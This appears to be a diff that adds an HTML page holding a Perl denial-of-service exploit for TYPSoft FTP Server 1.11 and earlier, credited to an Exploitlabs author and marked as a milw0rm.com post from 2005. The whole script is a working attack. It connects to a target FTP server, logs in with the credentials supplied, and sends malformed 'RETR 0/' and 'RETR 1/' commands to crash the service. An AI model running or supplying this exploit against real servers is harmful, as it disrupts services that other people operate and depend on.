@@ -1,0 +1,45 @@
+<html>
+<head>
+<title>TYPSoft FTP Server <= 1.11 (RETR) Denial of Service Vulnerability</title>
+<pre>
+#!/usr/bin/perl
+
+use IO::Socket;
+use Socket;
+
+print &quot;\n-= TYPSoft FTP Server &lt;= v1.11 DOS =-\n&quot;;
+print &quot;-= wood (at) Exploitlabs.com =-\n\n&quot;;
+
+if($#ARGV &lt; 2 | $#ARGV &gt; 3) { die &quot;usage: perl typsoft-1.11-DOS.pl &lt;host&gt; &lt;user&gt; &lt;pass&gt; [port]\n&quot; };
+if($#ARGV &gt; 2) { $prt = $ARGV[3] } else { $prt = &quot;21&quot; };
+
+$adr = $ARGV[0];
+$usr = $ARGV[1];
+$pas = $ARGV[2];
+$err1 = &quot;RETR 0&quot;;
+$err2 = &quot;RETR 1&quot;;
+
+
+$remote = IO::Socket::INET-&gt;new(Proto=&gt;&quot;tcp&quot;, PeerAddr=&gt;$adr,
+PeerPort=&gt;$prt, Reuse=&gt;1) or die &quot;Error: cant connect to $adr:$prt\n&quot;;
+
+$remote-&gt;autoflush(1);
+
+print $remote &quot;USER $usr\n&quot; and print &quot;1. Sending : USER $usr...\n&quot; or die
+&quot;Error: cant send user\n&quot;;
+
+print $remote &quot;PASS $pas\n&quot; and print &quot;2. Sending : PASS $pas...\n&quot; or die
+&quot;Error: cant send pass\n&quot;;
+
+print $remote &quot;$err1/\n&quot; and print &quot;3. Sending : ErrorCode 1...\n&quot;;
+print $remote &quot;$err2/\n&quot; and print &quot;4. Sending : ErrorCode 2...\n\n&quot;or die 
+&quot;Error: cant send error code\n&quot;;
+
+print &quot;Attack done. press any key to exit\n&quot;;
+$bla= &lt;STDIN&gt;;
+close $remote; 
+
+# milw0rm.com [2005-10-14]
+</pre>
+</html>
+
